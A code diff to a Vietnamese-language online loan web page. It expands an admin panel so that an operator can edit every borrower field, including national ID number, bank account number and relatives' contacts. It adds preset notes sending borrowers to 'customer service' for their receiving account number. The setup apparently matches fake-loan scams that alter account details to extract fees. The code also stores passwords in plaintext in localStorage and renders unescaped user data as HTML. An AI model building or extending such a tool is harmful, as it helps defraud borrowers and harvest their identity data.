@@ -397,30 +397,85 @@
                     </div>
                 </div>
 
-                <!-- KHUNG XEM VÀ SỬA CHI TIẾT ĐƠN VAY -->
-                <div id="adminDetailBox" class="bg-amber-50/80 border border-amber-200 rounded-2xl p-4 space-y-3 text-xs md:text-sm hidden">
-                    <div class="flex justify-between items-center">
-                        <span class="font-black text-amber-900 text-sm" id="detName">Chi tiết hồ sơ</span>
+                <!-- KHUNG XEM VÀ SỬA TOÀN BỘ THÔNG TIN ĐƠN VAY -->
+                <div id="adminDetailBox" class="bg-amber-50/90 border border-amber-300 rounded-2xl p-4 space-y-3 text-xs md:text-sm hidden">
+                    <div class="flex justify-between items-center border-b border-amber-200 pb-2">
+                        <span class="font-black text-amber-900 text-sm">🛠️ Chỉnh Sửa Toàn Bộ Hồ Sơ</span>
                         <button onclick="closeAdminDetail()" class="text-slate-500 hover:text-slate-800 font-bold text-sm">✕ Đóng</button>
                     </div>
-                    <div class="space-y-1 text-slate-700 text-xs" id="detInfo"></div>
-                    
-                    <div class="space-y-2.5 pt-1">
-                        <label class="block font-bold text-slate-700">Sửa số tài khoản (STK) khách hàng:</label>
-                        <input type="text" id="editStk" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl font-semibold text-xs">
 
-                        <label class="block font-bold text-slate-700">Chọn nhanh ghi chú đơn vay:</label>
-                        <div class="flex flex-wrap gap-1.5 pt-1">
-                            <button type="button" onclick="setQuickNote('THÔNG BÁO : LIÊN HỆ CSKH ĐỂ BIẾT THÊM VỀ THÔNG TIN STK NHẬN TIỀN')" class="bg-amber-100 hover:bg-amber-200 text-amber-900 text-[10px] font-bold px-2.5 py-1.5 rounded-lg transition">💬 LH CSKH lấy STK nhận tiền</button>
-                            <button type="button" onclick="setQuickNote('Hồ sơ đã được phê duyệt thành công. Vui lòng liên hệ CSKH để nhận lệnh giải ngân.')" class="bg-emerald-100 hover:bg-emerald-200 text-emerald-900 text-[10px] font-bold px-2.5 py-1.5 rounded-lg transition">✅ Duyệt & Nhận giải ngân</button>
-                            <button type="button" onclick="setQuickNote('Hồ sơ thiếu thông tin xác thực. Vui lòng cập nhật lại ảnh CCCD để tiếp tục xử lý.')" class="bg-red-100 hover:bg-red-200 text-red-900 text-[10px] font-bold px-2.5 py-1.5 rounded-lg transition">⚠️ Thiếu thông tin CCCD</button>
-                            <button type="button" onclick="setQuickNote('Khoản vay đang chờ xác nhận từ bộ phận kế toán giải ngân.')" class="bg-blue-100 hover:bg-blue-200 text-blue-900 text-[10px] font-bold px-2.5 py-1.5 rounded-lg transition">⏳ Chờ kế toán giải ngân</button>
+                    <div class="space-y-2.5 text-xs">
+                        <div>
+                            <label class="block font-bold text-slate-700">Họ và tên khách:</label>
+                            <input type="text" id="editName" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl font-bold text-xs uppercase">
                         </div>
-                        <textarea id="editNote" placeholder="Hoặc tự nhập ghi chú tại đây..." class="w-full p-2.5 bg-white border border-slate-200 rounded-xl text-xs font-medium" rows="2"></textarea>
+                        <div class="grid grid-cols-2 gap-2">
+                            <div>
+                                <label class="block font-bold text-slate-700">Số tiền vay:</label>
+                                <input type="text" id="editAmount" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl font-bold text-xs">
+                            </div>
+                            <div>
+                                <label class="block font-bold text-slate-700">Kỳ hạn vay:</label>
+                                <input type="text" id="editTerm" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl font-bold text-xs">
+                            </div>
+                        </div>
+                        <div class="grid grid-cols-2 gap-2">
+                            <div>
+                                <label class="block font-bold text-slate-700">Đóng hàng tháng:</label>
+                                <input type="text" id="editMonthly" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl font-bold text-xs">
+                            </div>
+                            <div>
+                                <label class="block font-bold text-slate-700">Thu nhập:</label>
+                                <input type="text" id="editIncome" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl font-bold text-xs">
+                            </div>
+                        </div>
+                        <div class="grid grid-cols-2 gap-2">
+                            <div>
+                                <label class="block font-bold text-slate-700">Ngân hàng:</label>
+                                <input type="text" id="editBankName" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl font-bold text-xs">
+                            </div>
+                            <div>
+                                <label class="block font-bold text-slate-700">Số tài khoản (STK):</label>
+                                <input type="text" id="editStk" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl font-bold text-xs">
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block font-bold text-slate-700">Chủ tài khoản:</label>
+                            <input type="text" id="editBankOwner" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl font-bold text-xs uppercase">
+                        </div>
+                        <div class="grid grid-cols-2 gap-2">
+                            <div>
+                                <label class="block font-bold text-slate-700">CCCD:</label>
+                                <input type="text" id="editCccd" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl font-bold text-xs">
+                            </div>
+                            <div>
+                                <label class="block font-bold text-slate-700">Ngày sinh:</label>
+                                <input type="text" id="editDob" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl font-bold text-xs">
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block font-bold text-slate-700">Công ty / Nơi làm việc:</label>
+                            <input type="text" id="editCompany" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl font-bold text-xs">
+                        </div>
+                        <div>
+                            <label class="block font-bold text-slate-700">Người thân (Tên - SĐT - Quan hệ):</label>
+                            <input type="text" id="editRelative" class="w-full p-2.5 bg-white border border-slate-200 rounded-xl font-bold text-xs">
+                        </div>
+
+                        <div class="border-t border-amber-200 pt-2 space-y-2">
+                            <label class="block font-bold text-slate-700">Chọn nhanh ghi chú đơn vay:</label>
+                            <div class="flex flex-wrap gap-1.5">
+                                <button type="button" onclick="setQuickNote('THÔNG BÁO : LIÊN HỆ CSKH ĐỂ BIẾT THÊM VỀ THÔNG TIN STK NHẬN TIỀN')" class="bg-amber-100 hover:bg-amber-200 text-amber-900 text-[10px] font-bold px-2.5 py-1.5 rounded-lg transition">💬 LH CSKH lấy STK nhận tiền</button>
+                                <button type="button" onclick="setQuickNote('Hồ sơ đã được phê duyệt thành công. Vui lòng liên hệ CSKH để nhận lệnh giải ngân.')" class="bg-emerald-100 hover:bg-emerald-200 text-emerald-900 text-[10px] font-bold px-2.5 py-1.5 rounded-lg transition">✅ Duyệt & Nhận giải ngân</button>
+                                <button type="button" onclick="setQuickNote('Hồ sơ thiếu thông tin xác thực. Vui lòng cập nhật lại ảnh CCCD để tiếp tục xử lý.')" class="bg-red-100 hover:bg-red-200 text-red-900 text-[10px] font-bold px-2.5 py-1.5 rounded-lg transition">⚠️ Thiếu thông tin CCCD</button>
+                                <button type="button" onclick="setQuickNote('Khoản vay đang chờ xác nhận từ bộ phận kế toán giải ngân.')" class="bg-blue-100 hover:bg-blue-200 text-blue-900 text-[10px] font-bold px-2.5 py-1.5 rounded-lg transition">⏳ Chờ kế toán giải ngân</button>
+                            </div>
+                            <textarea id="editNote" placeholder="Hoặc tự nhập ghi chú tại đây..." class="w-full p-2.5 bg-white border border-slate-200 rounded-xl text-xs font-medium" rows="2"></textarea>
+                        </div>
                         
                         <div class="grid grid-cols-2 gap-2 pt-2">
-                            <button onclick="updateLoanAction('Đã duyệt - Giải ngân')" class="bg-emerald-600 hover:bg-emerald-500 text-white py-2.5 rounded-xl font-bold shadow text-xs">✅ Duyệt Đơn</button>
-                            <button onclick="updateLoanAction('Từ chối hồ sơ')" class="bg-red-600 hover:bg-red-500 text-white py-2.5 rounded-xl font-bold shadow text-xs">❌ Từ Chối</button>
+                            <button onclick="updateLoanAction('Đã duyệt - Giải ngân')" class="bg-emerald-600 hover:bg-emerald-500 text-white py-2.5 rounded-xl font-bold shadow text-xs">✅ Lưu & Duyệt Đơn</button>
+                            <button onclick="updateLoanAction('Từ chối hồ sơ')" class="bg-red-600 hover:bg-red-500 text-white py-2.5 rounded-xl font-bold shadow text-xs">❌ Lưu & Từ Chối</button>
                         </div>
                     </div>
                 </div>
@@ -458,7 +513,7 @@
         </div>
     </nav>
 
-    <!-- MODAL THÔNG BÁO TÙY CHỈNH (HIỆN RÕ RÀNG KHI ĐĂNG KÝ/ĐĂNG NHẬP) -->
+    <!-- MODAL THÔNG BÁO TÙY CHỈNH -->
     <div id="customModal" class="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
         <div class="bg-white rounded-3xl max-w-xs w-full p-6 text-center space-y-4 shadow-2xl">
             <div id="modalIcon" class="text-4xl">✅</div>
@@ -662,6 +717,7 @@
         };
 
         function checkLoginState() {
+            allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
             const btn = document.getElementById('userAccountBtn');
             if (isAdminLoggedIn) {
                 btn.textContent = "🛡️ Quản Trị";
@@ -685,6 +741,7 @@
         }
 
         function switchTab(tabName) {
+            allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
             document.getElementById('stepHome').classList.add('hidden');
             document.getElementById('tabLoanInfo').classList.add('hidden');
             document.getElementById('tabApplications').classList.add('hidden');
@@ -699,6 +756,7 @@
                 document.getElementById('stepHome').classList.remove('hidden');
                 if (isAdminLoggedIn) {
                     document.getElementById('adminPanel').classList.remove('hidden');
+                    renderAdminLoanList();
                 }
             } else if(tabName === 'loanInfo') {
                 document.getElementById('tabLoanInfo').classList.remove('hidden');
@@ -710,12 +768,12 @@
                 if(!currentUser && !isAdminLoggedIn) { openAuthModal(); return; }
                 if (isAdminLoggedIn) {
                     document.getElementById('adminPanel').classList.remove('hidden');
+                    renderAdminLoanList();
                 } else {
                     document.getElementById('profileFullName').textContent = currentUserName || "Khách hàng";
                     document.getElementById('profileUserPhone').textContent = "SĐT: " + currentUser;
                     document.getElementById('profileAvatar').textContent = (currentUserName || "K").charAt(0).toUpperCase();
                     
-                    // Kiểm tra xem khách đã gửi hồ sơ eKYC chưa để hiển thị đúng trạng thái định danh
                     const userLoan = allLoans.find(l => l.user === currentUser);
                     const badge = document.getElementById('ekycBadge');
                     if(userLoan) {
@@ -782,7 +840,6 @@
             }
         }
 
-        // --- ĐĂNG KÝ: KIỂM TRA TRÙNG LẶP VÀ HIỆN THÔNG BÁO CHUẨN XÁC ---
         function handleRegister() {
             const name = document.getElementById('regName').value.trim();
             const phone = document.getElementById('regPhone').value.trim();
@@ -802,13 +859,11 @@
             users.push({ name, phone, pass });
             localStorage.setItem('ff_users', JSON.stringify(users));
 
-            // Hiển thị popup thông báo đăng ký thành công ngay lập tức
             showModal("Đăng Ký Thành Công", "Đăng ký thành công! Mời bạn đăng nhập.", "🎉");
             document.getElementById('loginPhone').value = phone;
             switchAuthTab('login');
         }
 
-        // --- ĐĂNG NHẬP: KIỂM TRA TÀI KHOẢN VÀ BÁO LỖI LỊCH SỰ ---
         function handleLogin() {
             const user = document.getElementById('loginPhone').value.trim();
             const pass = document.getElementById('loginPass').value.trim();
@@ -866,6 +921,7 @@
         }
 
         function renderAdminLoanList() {
+            allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
             const listEl = document.getElementById('adminLoanList');
             const selectEl = document.getElementById('quickClientSelect');
             if(!listEl) return;
@@ -883,7 +939,7 @@
                 html += `<div onclick="selectAdminLoan(${idx})" class="p-3.5 bg-white border border-slate-200 rounded-xl cursor-pointer hover:border-amber-400 transition space-y-1.5 text-xs shadow-sm">
                     <div class="flex justify-between font-bold text-slate-900 text-sm"><span>${loan.name}</span><span class="text-amber-600">${loan.amount} (${loan.term})</span></div>
                     <div class="text-xs text-slate-600">SĐT/Mã phiên: #${loan.user} | STK: ${loan.bankAccount}</div>
-                    <div class="flex justify-between items-center pt-1"><span class="text-[11px] font-bold px-2.5 py-0.5 rounded bg-amber-50 text-amber-700">${loan.status}</span><span class="text-xs text-blue-600 font-bold">🔍 Bấm xử lý đơn</span></div>
+                    <div class="flex justify-between items-center pt-1"><span class="text-[11px] font-bold px-2.5 py-0.5 rounded bg-amber-50 text-amber-700">${loan.status}</span><span class="text-xs text-blue-600 font-bold">🔍 Bấm để sửa toàn bộ đơn</span></div>
                 </div>`;
                 
                 selectHtml += `<option value="${loan.user}">Khách: ${loan.name} (SĐT: #${loan.user})</option>`;
@@ -906,19 +962,21 @@
         function selectAdminLoan(idx) {
             currentSelectedLoanId = idx;
             const loan = allLoans[idx];
-            document.getElementById('detName').textContent = `Hồ sơ: ${loan.name}`;
-            document.getElementById('detInfo').innerHTML = `
-                <p><b>Số tiền vay:</b> ${loan.amount} | <b>Kỳ hạn:</b> ${loan.term}</p>
-                <p><b>Đóng hàng tháng:</b> ${loan.monthlyPayment} | <b>Ngày đóng lãi:</b> ${loan.payDay}</p>
-                <p><b>Mục đích vay:</b> ${loan.purpose} | <b>Thu nhập:</b> ${loan.income}</p>
-                <p><b>Công ty:</b> ${loan.company} (${loan.compPhone})</p>
-                <p><b>Ngày sinh:</b> ${loan.dob} | <b>CCCD:</b> ${loan.cccd}</p>
-                <p><b>Quê quán:</b> ${loan.address}</p>
-                <p><b>Người thân:</b> ${loan.rName} - ${loan.rPhone} (${loan.rRelation})</p>
-                <p><b>Ngân hàng:</b> ${loan.bankName} | <b>Chủ thẻ:</b> ${loan.bankOwner}</p>
-            `;
-            document.getElementById('editStk').value = loan.bankAccount;
+            
+            document.getElementById('editName').value = loan.name || '';
+            document.getElementById('editAmount').value = loan.amount || '';
+            document.getElementById('editTerm').value = loan.term || '';
+            document.getElementById('editMonthly').value = loan.monthlyPayment || '';
+            document.getElementById('editIncome').value = loan.income || '';
+            document.getElementById('editBankName').value = loan.bankName || '';
+            document.getElementById('editStk').value = loan.bankAccount || '';
+            document.getElementById('editBankOwner').value = loan.bankOwner || '';
+            document.getElementById('editCccd').value = loan.cccd || '';
+            document.getElementById('editDob').value = loan.dob || '';
+            document.getElementById('editCompany').value = loan.company || '';
+            document.getElementById('editRelative').value = (loan.rName || '') + " - " + (loan.rPhone || '') + " - " + (loan.rRelation || '');
             document.getElementById('editNote').value = loan.note || '';
+
             document.getElementById('adminDetailBox').classList.remove('hidden');
         }
 
@@ -929,12 +987,25 @@
 
         function updateLoanAction(newStatus) {
             if(currentSelectedLoanId === null) return;
-            allLoans[currentSelectedLoanId].status = newStatus;
+            
+            allLoans[currentSelectedLoanId].name = document.getElementById('editName').value;
+            allLoans[currentSelectedLoanId].amount = document.getElementById('editAmount').value;
+            allLoans[currentSelectedLoanId].term = document.getElementById('editTerm').value;
+            allLoans[currentSelectedLoanId].monthlyPayment = document.getElementById('editMonthly').value;
+            allLoans[currentSelectedLoanId].income = document.getElementById('editIncome').value;
+            allLoans[currentSelectedLoanId].bankName = document.getElementById('editBankName').value;
             allLoans[currentSelectedLoanId].bankAccount = document.getElementById('editStk').value;
+            allLoans[currentSelectedLoanId].bankOwner = document.getElementById('editBankOwner').value;
+            allLoans[currentSelectedLoanId].cccd = document.getElementById('editCccd').value;
+            allLoans[currentSelectedLoanId].dob = document.getElementById('editDob').value;
+            allLoans[currentSelectedLoanId].company = document.getElementById('editCompany').value;
             allLoans[currentSelectedLoanId].note = document.getElementById('editNote').value;
+            allLoans[currentSelectedLoanId].status = newStatus;
+
             localStorage.setItem('ff_loans', JSON.stringify(allLoans));
             renderAdminLoanList();
             closeAdminDetail();
+            showModal("Thành Công", "Đã cập nhật và lưu toàn bộ thông tin hồ sơ thành công!");
         }
 
         function startLoanProcess() {
